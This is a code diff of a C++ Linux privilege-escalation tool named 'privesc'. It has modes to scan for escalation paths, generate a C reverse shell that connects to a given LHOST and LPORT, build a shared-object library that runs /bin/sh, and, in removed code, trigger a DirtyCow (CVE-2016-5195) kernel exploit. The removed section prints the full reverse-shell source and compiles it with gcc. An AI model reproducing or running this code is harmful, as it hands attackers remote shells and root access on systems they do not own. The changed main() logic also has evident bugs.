@@ -143,9 +143,6 @@ bool CheckIfStraceExists(std::string test1) {
 
 
 
-
-
-
 void DirtyCowCheck(void) {
   // char speechMark = '"';
 
@@ -179,161 +176,13 @@ void DirtyCowCheck(void) {
   }
 }
 
-void kernelShell(void) {
-  // char speechMark = '"';
-  std::cout << "Retriving Kernel Shell via CVE 2016-5195(DirtyCow) Exploit"
-            << std::endl;
-
-  struct utsname version;
-  int newVersion;
-  std::string release;
-
-  if (uname(&version) == -1) {
-    std::cout << "Failed" << std::endl;
-  } else {
-    std::cout << "Checking Version Compatability" << std::endl;
-  }
-
-  release.push_back(version.release[0]);
-  release.push_back(version.release[2]);
-
-  std::stringstream obj;
-
-  obj << release;
-  obj >> newVersion;
-  if (newVersion >= 50) {
-    std::cout << "DirtyCow Attack not compatible" << std::endl;
-    exit(EXIT_SUCCESS);
-  }
-
-  // DIRTYCOW EXPLOIT GOES HERE
-
-  DirtyCowExploit();
-}
 
 
 
-/*int writeShell(char *argv[]) // void writeShell(char *argv[])
-{
-  std::cout << "[+] GENERATING PAYLOAD...." << std::endl;
-  putchar('\n');
-
-  std::string lhost = argv[2];
-  std::string lport = argv[3];
-  int lhostlen = lhost.length();
-  char lhostArray[lhostlen];
-  char lportArray[11];
-  char LHOST[22];
-  char LPORT[5];
-  char QuotationMark = '"';
-
-  lhost.copy(lhostArray, lhostlen);
-  lport.copy(lportArray, 11);
-
-  // int sizeofArray = sizeof(lhostArray)/sizeof(lhostArray[0]);
-  // std::cout << sizeofArray << std::endl;
-
-  std::string equalhost;
-  std::string equalport;
-  equalhost.push_back(lhostArray[5]);
-
-  if (equalhost != "=") {
-    std::cout << "LHOST ERROR. Please use LHOST=" << std::endl;
-    exit(EXIT_FAILURE);
-  }
-
-  equalport.push_back(lportArray[5]);
-
-  if (equalport != "=") {
-    std::cout << "LPORT ERROR. Please use LPORT=" << std::endl;
-    std::cout << "LOOP LPORT [5]" << lportArray[5] << std::endl;
-    exit(EXIT_FAILURE);
-  }
-
-  for (int i = 6; i < 21; i++) {
-    LHOST[i - 6] = lhostArray[i];
-    LPORT[i - 6] = lportArray[i];
-  }
-
-  std::stoi(LPORT);
-  lport = LPORT;
-
-  std::cout << "-----------------------------------" << std::endl;
-  putchar('\n');
-  std::string payload = "#include <stdio.h>\n"
-                        "#include <sys/socket.h>\n"
-                        "#include <sys/types.h>\n"
-                        "#include <stdlib.h>\n"
-                        "#include <unistd.h>\n"
-                        "#include <netinet/in.h>\n"
-                        "#include <arpa/inet.h>\n"
-
-                        "int main(void)\n"
-                        "{\n"
-                        "    int port = " +
-                        lport +
-                        ";\n"
-                        "    struct sockaddr_in revsockaddr;\n"
-                        "    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n"
-                        "    revsockaddr.sin_family = AF_INET;\n"
-                        "    revsockaddr.sin_port = htons(port);\n"
-                        "    revsockaddr.sin_addr.s_addr = inet_addr(" +QuotationMark + "" + LHOST + "" + QuotationMark +");\n"
-                        "    connect(sockt, (struct sockaddr *) &revsockaddr,\n"
-                        "    sizeof(revsockaddr));\n"
-                        "    dup2(sockt, 0);\n"
-                        "    dup2(sockt, 1);\n"
-                        "    dup2(sockt, 2);\n"
-                        "    char * const argv[] = {" +
-                        QuotationMark +
-                        ""
-                        "/bin/sh" +
-                        QuotationMark +
-                        ", NULL};\n"
-                        "    execve(" +
-                        QuotationMark +
-                        ""
-                        "/bin/sh" +
-                        QuotationMark +
-                        ", argv, NULL);\n"
-                        "    return 0;\n"
-                        "}\n";
-
-  std::cout << payload << std::endl;
-  putchar('\n');
-  std::cout << "--------------------------------------" << std::endl;
-
-  putchar('\n');
-  std::cout << "[+] DOUBLE CHECK THE PAYLOAD, HAPPY?[Y/N]: ";
-  std::string answer;
-  std::cin >> answer;
-  if (answer == "Y") {
-    std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
-    std::ofstream outf{"shell.c"};
-    if (!outf) {
-      std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
-      return 1;
-    } else {
-      outf << payload;
-      try {
-        int pid = fork();
-        if (pid == 0) {
-          std::system("gcc shell.c -o shell");
-          exit(EXIT_SUCCESS);
-        }
-      } catch (int a) {
-        std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
-      }
-    }
-  } else {
-    exit(EXIT_FAILURE);
-  }
-  return 0;
-} */
-
-int writeLibrary(std::string lhost, std::string lport)
+int writeLibrary(void)
 {
     
-        std::cout << "From New Write Library" << std::endl;  
+        std::cout << "Shared Object Library Code" << std::endl;  
     std::cout << "-----------------------------------" << std::endl;
     putchar('\n');
     std::string payload = "#include <stdio.h>\n"
@@ -386,8 +235,7 @@ int writeLibrary(std::string lhost, std::string lport)
 
 int writeShellNew(std::string lhost, std::string lport)
 {
-
-    std::cout << "From New Write Shell" << std::endl;  
+    _NLINE;
     char QuotationMark = '"';
     std::cout << "-----------------------------------" << std::endl;
     putchar('\n');
@@ -463,7 +311,7 @@ int writeShellNew(std::string lhost, std::string lport)
   
 }
 
-int Parser(char *argv[]) // void writeShell(char *argv[])
+int Parser(char *argv[]) // Parses LHOST and LPORT from main
 {
   putchar('\n');
   std::string parameter = argv[1];
@@ -499,15 +347,10 @@ int Parser(char *argv[]) // void writeShell(char *argv[])
   {
     writeShellNew(lhost, lport);
   }
-  if (std::string(argv[1]) == "-library")
-  {
-      writeLibrary(lhost, lport);
-  }
 
   return 0;
 }
 
-void GetShell(void) { std::cout << "Called from GetShell()" << std::endl; }
 
 void SysInfo(void) {
   std::cout << ("\n-----------------------------------------------\n");
@@ -791,27 +634,22 @@ void SudoL(void) {
 
 int main(int argc, char *argv[]) {
   std::string sudoPass;
-  int retflag;
-  int LHOST;
-  int LPORT;
   int argFlag = 0;
 
   if (argc == 1) {
     std::cout << "No Argument supplied" << std::endl;
     exit(EXIT_SUCCESS);
   }
+  
   if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "/?") {
     std::cout << "\n-Scan [scan for escalation]\n"
-                 "-kernel-shell [Escalate via CVE 2016-5195(DirtyCOw) Use with "
-                 "caution]\n"
-                 "-shell [Attempts to get a reverse shell ASAP] usage: "
-                 "./privesc -shell LHOST=<IP> LPORT=<PORT>\n";
+                 "-shell [Generated a Reverse Shell in C] usage: "
+                 "./privesc -shell LHOST=<IP> LPORT=<PORT>\n"
+                 "-library [Generated a Shared Object Library which executes /bin/sh\n]";
     putchar('\n');
     exit(EXIT_SUCCESS);
   }
-  if (std::string(argv[1]) == "-kernel-shell") {
-    kernelShell();
-  }
+  
   if (std::string(argv[1]) == "-scan") {
     std::cout << "\nScan Mode" << std::endl;
 
@@ -829,77 +667,54 @@ int main(int argc, char *argv[]) {
     exit(EXIT_SUCCESS);
   }
 
-  if (std::string(argv[1]) == "-shell") {
-    std::cout << "GENERATING PAYLOAD" << std::endl;
-    // exit(EXIT_SUCCESS);
-    if (std::string(argv[2]) != " ") {
-
-      // std::cout << "LHOST: " << argv[2] << std::endl;
-      argFlag++;
-
-    } else {
-      std::cout << "Please provide LHOST" << std::endl;
-    }
-    if (std::string(argv[3]) != " ") {
-      // std::cout << "LPORT: " << argv[3] << std::endl;
-      argFlag++;
-    } else {
-      std::cout << "Please provide LPORT" << std::endl;
-    }
-    if (argFlag == 2) {
-      // std::cout << "*argv: " << *argv << std::endl;
-      // std::cout << "argv[2]: "<< argv[2] << std::endl;
-      // std::cout << "argv[3]: "<< argv[3] << std::endl;
-      Parser(argv);
-      exit(EXIT_SUCCESS);
-    } else {
-      std::cout << "Settings incorrect, try again" << std::endl;
-      exit(EXIT_FAILURE);
-    }
-
-  }
-  if (std::string(argv[1]) == "-library") {
-    std::cout << "Getting Library" << std::endl;
-    // exit(EXIT_SUCCESS);
-    if (std::string(argv[2]) != " ") {
-
-      // std::cout << "LHOST: " << argv[2] << std::endl;
-      argFlag++;
-
-    } else {
-      std::cout << "Please provide LHOST" << std::endl;
-    }
-    if (std::string(argv[3]) != " ") {
-      // std::cout << "LPORT: " << argv[3] << std::endl;
-      argFlag++;
-    } else {
-      std::cout << "Please provide LPORT" << std::endl;
-    }
-    if (argFlag == 2) {
-      // std::cout << "*argv: " << *argv << std::endl;
-      // std::cout << "argv[2]: "<< argv[2] << std::endl;
-      // std::cout << "argv[3]: "<< argv[3] << std::endl;
-      Parser(argv);
-      exit(EXIT_SUCCESS);
-    } else {
-      std::cout << "Settings incorrect, try again" << std::endl;
-      exit(EXIT_FAILURE);
-    }
+    if (std::string(argv[1]) == "-shell") 
+    {
+        if (argv[2] != NULL) 
+        {
+            argFlag++;
+        } 
+        else 
+        {
+            std::cout << "Please provide LHOST" << std::endl;
+        }
+        if (argv[3] != NULL) 
+        {
+            argFlag++;
+        } 
+        else 
+        {
+            std::cout << "Please provide LPORT" << std::endl;
+        }
+        if (argFlag != 2) 
+        {
+            std::cout << "[!] Incorrect Settings, Did you mean -shell LHOST=<IP> LPORT=<PORT>" << std::endl; 
+            exit(EXIT_FAILURE);
+        } 
+        else 
+        {
+            Parser(argv);
+            exit(EXIT_SUCCESS);
+        }
 
   }
-
-  else {
+  if (std::string(argv[1]) == "-library") 
+  {
+      writeLibrary();
+      exit(EXIT_SUCCESS);
+  } 
+  else 
+  {
+      std::cout << "Settings incorrect, Did you mean \"-library\"? " << std::endl;
+      exit(EXIT_FAILURE);
+  }
+    
+  if (std::string(argv[1]) != "-scan" || std::string(argv[1]) != "-shell" || std::string(argv[1]) != "-library" ) 
+  {
     std::cout << "Invalid Arguments" << std::endl;
     exit(EXIT_FAILURE);
   }
 
 
-  SysInfo();
-  WFP();
-  cronTab();
-  FindAllsuid();
-
-  SudoL();
 
   return 0;
 }
